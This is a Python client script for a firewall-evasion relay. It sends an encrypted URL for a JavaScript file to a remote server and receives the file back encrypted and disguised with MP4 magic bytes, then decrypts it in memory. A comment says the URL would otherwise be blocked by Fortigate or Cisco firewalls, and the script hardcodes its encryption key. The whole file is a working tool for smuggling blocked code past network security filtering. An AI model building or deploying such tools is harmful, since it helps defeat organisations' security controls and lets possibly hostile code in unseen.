import requests
from cryptography.fernet import Fernet
import io
import hashlib

# Encryption key (must be the same as used by the server)
key = b"hgAtgqgANA5qYEFr5FgB_wG5WFN-a2s6K07bo5_fMfQ="
cipher_suite = Fernet(key)

# URL to be encrypted (Normally will be banned on Fortigate or Cisco next ten fws)
file_url = "https://ex-torrenty.org/java_klappe.js"
encrypted_file_url = cipher_suite.encrypt(file_url.encode("utf-8")).decode("utf-8")

# Server details
host = "http://maluch.mikr.us:30157"

# Making the request to the server with the encrypted URL
response = requests.get(host, params={"url": encrypted_file_url})

if response.status_code == 200:
    print("Response received from server.")

    # Extract magic bytes from headers
    magic_bytes_length = 8  # Length of the magic bytes added for MP4
    magic = response.headers.get("magic")
    if magic:
        magic_bytes = bytes.fromhex(magic)
    else:
        magic_bytes = b"\x00\x00\x00\x18ftyp"  # Default magic bytes for MP4

    # Using BytesIO to handle the file in memory
    encrypted_data = io.BytesIO(response.content)
    c_hash1 = hashlib.sha256(encrypted_data.read()).hexdigest()
    # Verify the beginning of the encrypted data
    print("First 32 bytes of received encrypted content:", encrypted_data.read(32))

    # Strip the magic bytes before decryption
    encrypted_data.seek(magic_bytes_length)
    encrypted_file_restored = magic_bytes + encrypted_data.read()
    c_hash2 = (hashlib.sha256(encrypted_file_restored).hexdigest())

    # Hash the encrypted content to verify integrity
    s_hash1 = response.headers.get('hash1')
    s_hash2 = response.headers.get('hash2')
    s_hash3 = response.headers.get('hash3')
    # c_hash2 = hashlib.sha256(response.content).hexdigest()
    # c_hash3 = hashlib.sha256(encrypted_file_content).hexdigest()
    
    


    try:
        # Decrypting the file data in memory
        decrypted_data = cipher_suite.decrypt(encrypted_file_restored)
        c_hash3 = hashlib.sha256(decrypted_data).hexdigest()
        
        # Hash sum up: (Matches in reversed order)
        print("Server Hashes:\n", s_hash1, s_hash2, s_hash3)
        print("Client Hashes:\n", c_hash1, c_hash2, c_hash3)

        # If you need to work with the decrypted data as a file-like object
        decrypted_file = io.BytesIO(decrypted_data)

        # Example: Read the first few bytes of the decrypted file
        print("First 32 bytes of decrypted content:", decrypted_file.read(32))

        # Reset the pointer to the start of the file for any further operations
        decrypted_file.seek(0)

        print("File decrypted and handled in memory successfully.")


        
        
    except Exception as e:
        print("Decryption failed:", str(e))
else:
    print("Failed to download the file:", response.content.decode())
